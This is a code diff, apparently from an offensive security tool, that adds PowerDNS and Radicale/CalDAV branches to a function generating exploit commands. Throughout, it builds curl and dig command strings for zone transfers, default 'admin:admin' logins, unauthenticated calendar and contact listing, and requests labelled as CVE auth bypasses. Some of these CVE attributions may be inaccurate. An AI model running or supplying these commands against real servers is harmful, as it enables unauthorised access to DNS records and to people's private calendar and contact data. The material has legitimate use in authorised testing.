@@ -406,6 +406,35 @@ def generate_exploit_commands(vector: AttackVector) -> List[str]:
                 p = cred["password"]
                 commands.append(f"curl -sk -u '{u}:{p}' {target}/  # {u}:{p}")
 
+    # ── PowerDNS / PowerGSLB ────────────────────────────────────────
+    elif "powerdns" in title or "powergslb" in title:
+        commands.extend([
+            f"# PowerDNS enumeration against {target}",
+            f"dig version.bind CHAOS TXT @{target.split(':')[0]}",
+            f"dig axfr @{target.split(':')[0]}",
+            "# PowerDNS default admin panel (port 8081):",
+            f"curl -sk -u 'admin:admin' http://{target.split(':')[0]}:8081/servers",
+            "# CVE-2020-10030 (PowerDNS auth bypass < 4.3.0):",
+            f"curl -sk http://{target.split(':')[0]}:8081/servers/localhost/config",
+        ])
+
+    # ── Radicale / CalDAV ───────────────────────────────────────────
+    elif "radicale" in title or "caldav" in title or "caldav" in vtype:
+        commands.extend([
+            f"# Radicale/CalDAV enumeration against {target}",
+            f"curl -sk -X OPTIONS {target}/ -D -",
+            f"curl -sk -X PROPFIND {target}/ -H 'Depth: 0' "
+            f"-H 'Content-Type: application/xml' "
+            f"-d '<?xml version=\"1.0\"?><d:propfind xmlns:d=\"DAV:\"><d:prop><d:current-user-principal/></d:prop></d:propfind>'",
+            "# List calendars/contacts (unauthenticated):",
+            f"curl -sk -X PROPFIND {target}/ -H 'Depth: 1' "
+            f"-H 'Content-Type: application/xml' "
+            f"-d '<?xml version=\"1.0\"?><d:propfind xmlns:d=\"DAV:\"><d:prop><d:resourcetype/></d:prop></d:propfind>'",
+            "# CVE-2019-17266 (Radicale auth bypass < 2.1.2):",
+            f"curl -sk {target}/root/",
+            f"curl -sk -u 'admin:admin' {target}/root/",
+        ])
+
     # ── Fallback: return the vector's own exploit_suggestions ────────
     if not commands and suggestions:
         return suggestions
